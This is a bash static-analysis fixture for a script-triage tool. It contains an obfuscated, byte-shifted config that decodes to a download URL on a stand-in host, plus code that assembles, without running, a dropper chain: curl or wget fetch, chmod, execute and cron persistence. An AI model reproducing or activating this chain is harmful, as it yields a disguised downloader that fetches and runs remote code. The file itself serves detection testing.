# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_bbd1f14d='122:65:53:128:119:120:105:116:119:65:116:118:115:106:109:112:105:99:108:115:119:120:48:101:103:117:121:109:118:105:99:118:105:113:115:120:105:48:123:118:109:120:105:99:106:109:112:105:48:103:108:101:114:107:105:99:113:115:104:105:48:104:109:119:116:101:120:103:108:99:116:118:115:103:105:119:119:128:101:104:101:116:120:105:118:65:123:107:105:120:99:101:118:103:108:99:106:101:112:112:102:101:103:111:128:119:120:101:107:105:99:103:115:121:114:120:65:57:128:103:101:113:116:101:109:107:114:99:109:104:65:103:101:113:116:101:109:107:114:49:104:56:56:105:104:52:52:52:56:102:128:121:118:112:65:108:120:120:116:119:62:51:51:104:56:56:105:104:52:52:52:56:102:50:105:124:101:113:116:112:105:50:109:114:122:101:112:109:104:51:60:52:54:105:54:53:102:53:50:119:108:128:121:119:105:118:99:101:107:105:114:120:65:76:121:114:120:118:105:119:119:80:101:102:51:104:56:56:105:104:52:52:52:56:102:128:106:109:112:105:99:116:101:120:108:65:51:120:113:116:51:108:121:114:120:118:105:119:119:49:103:101:103:108:105:51:50:119:120:101:107:105:49:104:56:56:105:104:52:52:52:56:102:128:101:118:103:108:99:116:118:115:102:105:65:121:114:101:113:105:49:113:128:119:105:118:122:109:103:105:99:114:101:113:105:65:121:116:104:101:120:105:49:104:56:56:105:104:52:52:52:56:102:50:119:105:118:122:109:103:105:128:103:118:115:114:99:116:101:120:108:65:51:105:120:103:51:103:118:115:114:50:104:51:121:116:104:101:120:105:49:104:56:56:105:104:52:52:52:56:102'
readonly Codec_bbd1f14d='decimal_colon|add_modulo_256|04'

Load_bbd1f14d() {
  EnCoDeD_Bytes=()
  local IFS=':'
  read -r -a EnCoDeD_Bytes <<< "${Material_bbd1f14d}"
}

Decode_bbd1f14d() {
  DeCoDeD_Bytes=()
  local InDeX
  for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
    DeCoDeD_Bytes+=("$(((EnCoDeD_Bytes[InDeX] - 4 + 256) % 256))")
  done
}

Recover_bbd1f14d() {
  local -a EnCoDeD_Bytes DeCoDeD_Bytes
  local DeScRiPtOr_Text NeUtRaL PaSs InDeX
  NeUtRaL="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_bbd1f14d
  for PaSs in 1; do Decode_bbd1f14d; done
  DeScRiPtOr_Text=''
  local octal character
  for InDeX in "${!DeCoDeD_Bytes[@]}"; do
    printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
    printf -v character '%b' "\\$octal"
    DeScRiPtOr_Text+="$character"
  done
  printf '%s\n' "$DeScRiPtOr_Text"
}

Inspect_bbd1f14d() { Recover_bbd1f14d; }

Plan_bbd1f14d() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_bbd1f14d)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_bbd1f14d; fi

# reconstruction complete